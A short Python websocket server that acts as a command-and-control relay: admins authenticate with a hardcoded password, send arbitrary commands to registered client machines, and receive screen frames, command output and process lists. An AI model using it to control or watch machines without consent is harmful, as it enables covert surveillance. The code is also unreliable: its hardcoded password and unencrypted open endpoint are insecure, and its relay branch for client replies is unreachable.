import asyncio
import websockets
import json

clients = {}  # client_id -> websocket
admins = set()  # all connected admin websockets

PASSWORD = "supersecurepassword"

async def handler(websocket, path):
    try:
        async for message in websocket:
            data = json.loads(message)
            msg_type = data.get("type")

            if path.startswith("/ws/client/"):
                client_id = path.split("/")[-1]
                clients[client_id] = websocket

                # send info to all admins
                for admin in admins:
                    await admin.send(json.dumps({"type": "client_connected", "client_id": client_id}))

            elif path == "/ws/admin/":
                if msg_type == "auth":
                    if data.get("password") == PASSWORD:
                        admins.add(websocket)
                        await websocket.send(json.dumps({"type": "auth_success"}))

                        # send all connected clients
                        for cid in clients:
                            await websocket.send(json.dumps({"type": "client_connected", "client_id": cid}))
                    else:
                        await websocket.send(json.dumps({"type": "auth_failed"}))
                        await websocket.close()
                elif msg_type == "command":
                    target_id = data.get("target")
                    command = data.get("command")
                    if target_id in clients:
                        await clients[target_id].send(json.dumps(command))

            # Relay screen_frame or other responses from client to admins
            elif msg_type in ("screen_frame", "cmd_result", "process_list"):
                for admin in admins:
                    await admin.send(json.dumps(data))

    except websockets.exceptions.ConnectionClosed:
        pass
    finally:
        # Cleanup
        if path.startswith("/ws/client/"):
            client_id = path.split("/")[-1]
            clients.pop(client_id, None)
            for admin in admins:
                await admin.send(json.dumps({"type": "client_disconnected", "client_id": client_id}))
        elif path == "/ws/admin/":
            admins.discard(websocket)


start_server = websockets.serve(handler, "0.0.0.0", 8765)

asyncio.get_event_loop().run_until_complete(start_server)
print("[SERVER] Running on ws://0.0.0.0:8765")
asyncio.get_event_loop().run_forever()
